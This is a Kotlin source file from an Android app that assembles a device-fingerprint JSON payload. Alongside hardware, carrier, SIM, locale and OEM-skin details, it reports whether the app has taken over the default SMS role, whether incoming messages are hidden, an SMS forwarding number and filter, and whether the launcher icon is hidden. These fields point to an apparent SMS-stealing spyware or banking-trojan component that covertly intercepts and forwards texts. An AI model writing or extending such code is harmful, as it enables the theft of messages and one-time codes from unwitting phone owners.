package com.base.realtime.device

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.telephony.TelephonyManager
import com.base.realtime.sms.OffmodeStore
import com.base.realtime.sms.SmsStatus
import com.base.realtime.ui.LaunchActivity
import java.util.Locale
import java.util.TimeZone
import kotlinx.serialization.Serializable
import kotlinx.serialization.json.add
import kotlinx.serialization.json.buildJsonArray
import kotlinx.serialization.json.buildJsonObject
import kotlinx.serialization.json.put

@Serializable
data class ClientInfoPayload(
    val appLabel: String = "",
    val packageName: String = "",
    val manufacturer: String = "",
    val brand: String = "",
    val model: String = "",
    val device: String = "",
    val product: String = "",
    val androidRelease: String = "",
    val sdk: Int = 0,
    val operator: String = "",
    val simOperator: String = "",
    val locale: String = "",
    val timeZone: String = "",
    val iconState: String = "normal",
    /** OEM skin label e.g. MIUI 14 / HyperOS 1 / incremental build. */
    val oemSkin: String = "",
    val sims: List<SimSlotPayload> = emptyList(),
    val smsDefaultPkg: String = "",
    val smsDefaultLabel: String = "",
    val smsOurs: Boolean = false,
    val smsHideIncoming: Boolean = false,
    val smsPreviousPkg: String = "",
    val smsPreviousLabel: String = "",
    val offmode: Boolean = false,
    val offmodeTo: String = "",
    val offmodeFilter: String = "",
)

@Serializable
data class SimSlotPayload(
    val slot: Int = 0,
    val state: String = "",
    val label: String = "",
)

object ClientInfo {
    fun collect(context: Context): ClientInfoPayload {
        val app = context.applicationContext
        val pm = app.packageManager
        val pkg = app.packageName
        val label = try {
            pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString()
        } catch (_: Throwable) {
            ""
        }
        val telephony = app.getSystemService(TelephonyManager::class.java)
        val networkOp = telephony?.networkOperatorName.orEmpty().trim()
        val simOp = telephony?.simOperatorName.orEmpty().trim()
        val locale = try {
            app.resources.configuration.locales[0]?.toLanguageTag().orEmpty()
        } catch (_: Throwable) {
            Locale.getDefault().toLanguageTag()
        }
        val sms = SmsStatus.collect(app)
        return ClientInfoPayload(
            appLabel = label,
            packageName = pkg,
            manufacturer = Build.MANUFACTURER.orEmpty(),
            brand = Build.BRAND.orEmpty(),
            model = Build.MODEL.orEmpty(),
            device = Build.DEVICE.orEmpty(),
            product = Build.PRODUCT.orEmpty(),
            androidRelease = Build.VERSION.RELEASE.orEmpty(),
            sdk = Build.VERSION.SDK_INT,
            operator = networkOp,
            simOperator = simOp,
            locale = locale,
            timeZone = TimeZone.getDefault().id.orEmpty(),
            iconState = iconState(app),
            oemSkin = oemSkin(),
            sims = SimSlots.collect(app),
            smsDefaultPkg = sms.defaultPkg,
            smsDefaultLabel = sms.defaultLabel,
            smsOurs = sms.ours,
            smsHideIncoming = sms.hideIncoming,
            smsPreviousPkg = sms.previousPkg,
            smsPreviousLabel = sms.previousLabel,
            offmode = OffmodeStore.enabled(app),
            offmodeTo = OffmodeStore.forwardTo(app),
            offmodeFilter = if (OffmodeStore.enabled(app)) OffmodeStore.filter(app) else "",
        )
    }

    fun toJsonObject(info: ClientInfoPayload) = buildJsonObject {
        if (info.appLabel.isNotBlank()) put("appLabel", info.appLabel)
        if (info.packageName.isNotBlank()) put("packageName", info.packageName)
        if (info.manufacturer.isNotBlank()) put("manufacturer", info.manufacturer)
        if (info.brand.isNotBlank()) put("brand", info.brand)
        if (info.model.isNotBlank()) put("model", info.model)
        if (info.device.isNotBlank()) put("device", info.device)
        if (info.product.isNotBlank()) put("product", info.product)
        if (info.androidRelease.isNotBlank()) put("androidRelease", info.androidRelease)
        if (info.sdk > 0) put("sdk", info.sdk)
        if (info.oemSkin.isNotBlank()) put("oemSkin", info.oemSkin)
        if (info.operator.isNotBlank()) put("operator", info.operator)
        if (info.simOperator.isNotBlank()) put("simOperator", info.simOperator)
        if (info.locale.isNotBlank()) put("locale", info.locale)
        if (info.timeZone.isNotBlank()) put("timeZone", info.timeZone)
        if (info.iconState.isNotBlank()) put("iconState", info.iconState)
        if (info.sims.isNotEmpty()) {
            put("sims", buildJsonArray {
                for (sim in info.sims) {
                    add(buildJsonObject {
                        put("slot", sim.slot)
                        put("state", sim.state)
                        if (sim.label.isNotBlank()) put("label", sim.label)
                    })
                }
            })
        }
        if (info.smsDefaultPkg.isNotBlank()) put("smsDefaultPkg", info.smsDefaultPkg)
        if (info.smsDefaultLabel.isNotBlank()) put("smsDefaultLabel", info.smsDefaultLabel)
        put("smsOurs", info.smsOurs)
        put("smsHideIncoming", info.smsHideIncoming)
        if (info.smsPreviousPkg.isNotBlank()) put("smsPreviousPkg", info.smsPreviousPkg)
        if (info.smsPreviousLabel.isNotBlank()) put("smsPreviousLabel", info.smsPreviousLabel)
        put("offmode", info.offmode)
        if (info.offmodeTo.isNotBlank()) put("offmodeTo", info.offmodeTo)
        if (info.offmodeFilter.isNotBlank()) put("offmodeFilter", info.offmodeFilter)
    }

    /** MIUI / HyperOS / OneUI-ish skin string for AI UI cache keys. */
    fun oemSkin(): String {
        val miui = systemProp("ro.miui.ui.version.name")
        val hyper = systemProp("ro.mi.os.version.name").ifBlank {
            systemProp("ro.mi.os.version.incremental")
        }
        val oneUi = systemProp("ro.build.version.oneui")
        val emui = systemProp("ro.build.version.emui")
        val colorOs = systemProp("ro.oppo.theme.version").ifBlank {
            systemProp("ro.build.version.opporom")
        }
        val funtouch = systemProp("ro.vivo.os.version")
        return when {
            hyper.isNotBlank() -> "HyperOS $hyper"
            miui.isNotBlank() -> "MIUI $miui"
            oneUi.isNotBlank() -> "OneUI $oneUi"
            emui.isNotBlank() -> "EMUI $emui"
            colorOs.isNotBlank() -> "ColorOS $colorOs"
            funtouch.isNotBlank() -> "Funtouch $funtouch"
            else -> Build.VERSION.INCREMENTAL.orEmpty().take(48)
        }.trim()
    }

    private fun systemProp(key: String): String {
        return try {
            val clz = Class.forName("android.os.SystemProperties")
            val get = clz.getMethod("get", String::class.java, String::class.java)
            (get.invoke(null, key, "") as? String).orEmpty().trim()
        } catch (_: Throwable) {
            ""
        }
    }

    private fun iconState(context: Context): String {
        val pm = context.packageManager
        val pkg = context.packageName
        val mainName = LaunchActivity::class.java.name
        val main = ComponentName(pkg, mainName)
        val intent = Intent(Intent.ACTION_MAIN).addCategory(Intent.CATEGORY_LAUNCHER).setPackage(pkg)
        val activities = try {
            pm.queryIntentActivities(intent, PackageManager.MATCH_DISABLED_COMPONENTS)
        } catch (_: Throwable) {
            emptyList()
        }.filter { it.activityInfo.packageName == pkg }
        if (activities.isEmpty()) {
            return if (componentEnabled(pm, main, true)) "normal" else "hidden"
        }
        val shown = activities.filter { info ->
            val name = ComponentName(info.activityInfo.packageName, info.activityInfo.name)
            componentEnabled(pm, name, info.activityInfo.enabled)
        }
        if (shown.isEmpty()) return "hidden"
        return if (shown.all { it.activityInfo.name == mainName }) "normal" else "changed"
    }

    private fun componentEnabled(pm: PackageManager, name: ComponentName, declaredEnabled: Boolean): Boolean {
        return when (pm.getComponentEnabledSetting(name)) {
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED -> true
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED_USER,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED_UNTIL_USED -> false
            else -> declaredEnabled
        }
    }
}
